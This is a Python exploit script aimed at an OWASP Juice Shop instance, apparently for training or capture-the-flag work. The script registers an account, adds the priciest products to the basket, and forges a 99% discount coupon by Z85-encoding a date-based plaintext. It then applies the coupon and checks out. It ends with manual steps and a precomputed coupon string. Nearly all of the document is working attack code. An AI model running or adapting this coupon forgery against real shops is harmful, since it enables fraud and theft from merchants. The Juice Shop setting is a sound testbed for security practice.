#!/usr/bin/env python3
"""
Get 99% Off - Maximum Discount Coupon Exploit
==============================================
Creates and applies 99% discount coupon to Juice Shop

Usage: python3 get_99_percent_off.py
"""

import requests
import time

# Z85 encoding (same algorithm as Juice Shop)
z85_alphabet = b"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"

def z85_encode(data: bytes) -> str:
    if len(data) % 4 != 0:
        raise ValueError("Length must be multiple of 4 bytes")
    encoded = []
    for i in range(0, len(data), 4):
        chunk = data[i:i+4]
        value = (chunk[0] << 24) + (chunk[1] << 16) + (chunk[2] << 8) + chunk[3]
        chars = []
        for _ in range(5):
            chars.append(z85_alphabet[value % 85])
            value //= 85
        encoded.extend(reversed(chars))
    return bytes(encoded).decode('ascii')

def get_99_percent_off():
    print("🔥 GETTING 99% OFF - MAXIMUM DISCOUNT EXPLOIT")
    print("=" * 60)
    
    # Target instance
    base_url = "https://juice5.wonkatech.org"
    session = requests.Session()
    
    # Step 1: Create account
    print("🔑 Creating test account...")
    email = f"max_discount{int(time.time())}@test.com"
    password = "MaxDiscount123!"
    
    session.post(f"{base_url}/api/Users/", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"
    })
    
    # Step 2: Login
    login = session.post(f"{base_url}/rest/user/login", json={
        "email": email, "password": password
    })
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("✅ Logged in successfully")
        
        # Step 3: Add expensive products
        print("🛒 Adding most expensive products...")
        products = session.get(f"{base_url}/rest/products/search").json()['data']
        
        # Add top 3 most expensive items
        expensive = sorted(products, key=lambda p: p['price'], reverse=True)[:3]
        total_value = 0
        
        for product in expensive:
            session.post(f"{base_url}/api/BasketItems/", json={
                "ProductId": product['id'], "quantity": 1
            })
            total_value += product['price']
            print(f"   Added: {product['name']} - ${product['price']}")
        
        print(f"\\n   💰 Total basket value: ${total_value:,.2f}")
        
        # Step 4: Generate 99% discount coupon
        print("\\n🔧 Generating 99% discount coupon...")
        from datetime import datetime
        current_month = datetime.now().strftime("%b").upper()
        current_year = datetime.now().strftime("%y")
        
        # Maximum discount coupon
        max_discount_plaintext = f"{current_month}{current_year}-99"
        max_discount_coupon = z85_encode(max_discount_plaintext.encode('ascii'))
        
        print(f"   Plaintext: {max_discount_plaintext}")
        print(f"   Z85 coupon: {max_discount_coupon}")
        print(f"   🔥 This gives 99% OFF!")
        
        # Step 5: Apply maximum discount
        user_data = session.get(f"{base_url}/rest/user/whoami").json()['user']
        basket_id = user_data.get('bid', 1)
        
        print(f"\\n💸 Applying 99% discount coupon...")
        
        coupon_response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{max_discount_coupon}", json={})
        
        if coupon_response.status_code == 200:
            result = coupon_response.json()
            discount = result.get('discount', 0)
            
            if discount == 99:
                final_price = total_value * 0.01  # Pay only 1%
                savings = total_value - final_price
                
                print(f"   ✅ 99% DISCOUNT APPLIED!")
                print(f"   💰 Original total: ${total_value:,.2f}")
                print(f"   💰 Final total: ${final_price:,.2f}")
                print(f"   💰 YOU SAVE: ${savings:,.2f}")
                print(f"   🔥 DISCOUNT: {discount}%")
                
                # Step 6: Complete the order
                print(f"\\n🛍️  Completing order with maximum discount...")
                
                checkout = session.post(f"{base_url}/rest/basket/{basket_id}/checkout", json={})
                
                if checkout.status_code in [200, 201]:
                    print(f"   🎉 ORDER COMPLETED!")
                    print(f"   💸 TOTAL PAID: ${final_price:,.2f}")
                    print(f"   💰 TOTAL SAVED: ${savings:,.2f}")
                    print(f"   📊 DISCOUNT: {discount}% OFF!")
                    
                    return True
        
        print("❌ Maximum discount failed")
    
    return False

if __name__ == '__main__':
    print("🎯 MAXIMUM DISCOUNT COUPON GENERATOR")
    print("Creates and applies 99% discount coupon")
    print("Target: juice5.wonkatech.org")
    print()
    
    success = get_99_percent_off()
    
    if success:
        print("\\n" + "="*60)
        print("🎉 SUCCESS! 99% DISCOUNT ACHIEVED!")
        print("🔥 MAXIMUM POSSIBLE SAVINGS UNLOCKED!")
        print("💰 Pay only 1% of original price!")
        print("="*60)
    else:
        print("\\n❌ Failed to apply maximum discount")
        
    # Show manual method
    print("\\n📖 MANUAL METHOD:")
    print("1. Generate coupon: python3 fixed_encode_coupon.py encode 'OCT25-99'")
    print("2. Copy result: pEw8ph7Z*G")  
    print("3. Apply in Juice Shop basket")
    print("4. Complete checkout for 99% savings!")

